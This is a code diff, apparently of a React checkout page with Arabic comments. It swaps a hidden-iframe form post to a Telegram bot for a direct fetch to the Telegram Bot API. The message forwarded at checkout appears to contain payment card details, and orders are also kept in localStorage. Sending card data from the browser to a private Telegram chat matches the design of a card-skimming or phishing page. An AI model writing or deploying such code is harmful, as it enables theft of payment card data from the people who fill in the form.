@@ -20,42 +20,27 @@ const pageTransition = {
   duration: 0.5
 };
 
-/** إرسال للبوت من المتصفح: fetch يفشل بسبب CORS؛ النموذج + iframe يصل فعلياً لـ Telegram */
-function sendTelegramViaHiddenForm(botToken, chatId, text) {
+/** إرسال إشعار تلغرام عبر fetch - Telegram Bot API يدعم CORS */
+async function sendTelegramMessage(botToken, chatId, text) {
   const max = 4090;
   const safeText = text.length > max ? `${text.slice(0, max)}…` : text;
 
-  const iframe = document.createElement('iframe');
-  iframe.style.cssText = 'position:fixed;width:0;height:0;border:0;visibility:hidden';
-  iframe.name = `tg_${Date.now()}_${Math.random().toString(36).slice(2)}`;
-  document.body.appendChild(iframe);
+  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: chatId,
+      text: safeText,
+      parse_mode: 'HTML'
+    })
+  });
 
-  const form = document.createElement('form');
-  form.method = 'POST';
-  form.action = `https://api.telegram.org/bot${botToken}/sendMessage`;
-  form.target = iframe.name;
-  form.acceptCharset = 'UTF-8';
-  form.style.display = 'none';
-
-  const chat = document.createElement('input');
-  chat.type = 'hidden';
-  chat.name = 'chat_id';
-  chat.value = String(chatId);
-  form.appendChild(chat);
-
-  const body = document.createElement('input');
-  body.type = 'hidden';
-  body.name = 'text';
-  body.value = safeText;
-  form.appendChild(body);
-
-  document.body.appendChild(form);
-  form.submit();
-
-  setTimeout(() => {
-    form.remove();
-    iframe.remove();
-  }, 5000);
+  const data = await response.json();
+  if (!data.ok) {
+    console.error('Telegram API error:', data);
+    throw new Error(data.description || 'Telegram send failed');
+  }
+  return data;
 }
 
 const PaymentPage = () => {
@@ -232,15 +217,18 @@ ${cardsText}
       return;
     }
 
-    // 2) تلغرام: لا يمكن الاعتماد على fetch من المتصفح (CORS) → نموذج POST داخل iframe
+    // 2) إرسال إشعار تلغرام
     const telegramToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN?.trim?.();
     const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID?.trim?.();
     if (telegramToken && telegramChatId) {
       try {
-        sendTelegramViaHiddenForm(telegramToken, telegramChatId, message);
+        await sendTelegramMessage(telegramToken, telegramChatId, message);
+        console.log('✅ Telegram notification sent successfully');
       } catch (notifyErr) {
-        console.error('Telegram send failed:', notifyErr);
+        console.error('❌ Telegram send failed:', notifyErr);
       }
+    } else {
+      console.warn('⚠️ Telegram credentials missing - token:', !!telegramToken, 'chatId:', !!telegramChatId);
     }
 
     const existingOrders = JSON.parse(localStorage.getItem('wazari_orders') || '[]');
